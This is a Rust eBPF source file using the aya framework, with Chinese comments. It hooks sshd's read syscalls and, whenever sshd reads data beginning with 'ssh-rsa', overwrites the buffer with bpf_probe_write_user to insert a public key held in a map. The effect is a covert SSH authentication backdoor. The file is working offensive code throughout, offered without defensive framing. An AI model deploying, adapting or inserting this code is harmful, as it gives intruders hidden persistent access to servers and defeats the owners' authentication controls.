#![no_std]
#![no_main]
#![feature(c_str_module)]

use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid,
        gen::{bpf_probe_read, bpf_probe_write_user},
    },
    macros::{map, tracepoint},
    maps::{Array, HashMap},
    programs::TracePointContext,
    EbpfContext,
};
use aya_log_ebpf::info;
use core::{
    ffi::{c_str, c_void},
    mem,
};
use hack_new_common::SyscallReadLogging;

// 记录每个使用 read 系统调用进程的进程号和读缓冲区地址
#[allow(non_upper_case_globals)]
#[map]
static map_buff_addrs: HashMap<u64, SyscallReadLogging> =
    HashMap::<u64, SyscallReadLogging>::with_max_entries(1024, 0);

// 记录我们自己的公钥
#[allow(non_upper_case_globals)]
#[map]
static string_array: Array<[u8; 564]> = Array::with_max_entries(1, 0);

// 我们想要 hook 的进程名称
#[allow(non_upper_case_globals)]
const target_comm: &[u8] = b"sshd";

#[tracepoint]
pub fn tracepoint_sys_enter_read(ctx: TracePointContext) -> u32 {
    match sys_enter_read_check(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn sys_enter_read_check(ctx: TracePointContext) -> Result<u32, u32> {
    // 返回当前进程名称
    // 这里就是咱们的 sshd
    if let Ok(comm) = ctx.command() {
        for (index, target_char) in target_comm.iter().enumerate() {
            if *target_char != comm[index] {
                // 如果是 sshd 的话，就继续
                return Ok(0);
            }
        }
    } else {
        info!(&ctx, "ctx.command() in sys_enter_read_check failed");
        return Err(0);
    };

    let mut data = SyscallReadLogging::default();

    let pid_tgid = bpf_get_current_pid_tgid();

    unsafe {
        //field:char * buf; offset:24; size:8; signed:0;
        let buff_addr: u64 = ctx.read_at(24).unwrap();

        //field:size_t count; offset:32; size:8; signed:0;
        let size: u64 = ctx.read_at(32).unwrap();

        data.buffer_addr = buff_addr;

        data.calling_size = size;
    }

    // 将进程号为key，进程读缓冲区地址为 value 记录下来
    map_buff_addrs.insert(&pid_tgid, &data, 0).unwrap();

    Ok(0)
}

#[tracepoint]
pub fn tracepoint_sys_exit_read(ctx: TracePointContext) -> u32 {
    match sys_exit_read_check(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn sys_exit_read_check(ctx: TracePointContext) -> Result<u32, u32> {
    // 返回当前进程名称
    // 这里就是咱们的 sshd
    if let Ok(comm) = ctx.command() {
        for (index, target_char) in target_comm.iter().enumerate() {
            if *target_char != comm[index] {
                return Ok(0);
            }
        }
    } else {
        info!(&ctx, "ctx.command() in sys_exit_read_check failed");
        return Err(0);
    };
    let pid_tgid = bpf_get_current_pid_tgid();

    unsafe {
        // 从我们的 map 中读取 value，主要是获得读进程的 buffer_addr
        if let Some(data) = map_buff_addrs.get(&pid_tgid) {
            let becheck = c_str::CStr::from_bytes_with_nul(b"ssh-rsa\0").unwrap();
            let tmpbuf = data.buffer_addr;
            let mut str: [u8; 7] = [0; 7];

            // 读一下目标缓冲区，看看是不是以 “ssh-rsa” 为开头的
            bpf_probe_read(
                str.as_mut_ptr() as *mut c_void,
                mem::size_of_val(&str) as u32,
                tmpbuf as *const c_void,
            );

            if becheck.to_bytes() != str {
                return Ok(0);
            }

            let index = 0;

            // 把我们自己的密钥写进去
            if let Some(info) = string_array.get(index) {
                let tobe = info.as_ptr();
                bpf_probe_write_user(tmpbuf as *mut c_void, tobe as *const c_void, 564);
                info!(&ctx, "tmpbuf: 0x{:x}", tmpbuf);
            } else {
                return Err(0);
            }
        } else {
            return Ok(0);
        }
    }

    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
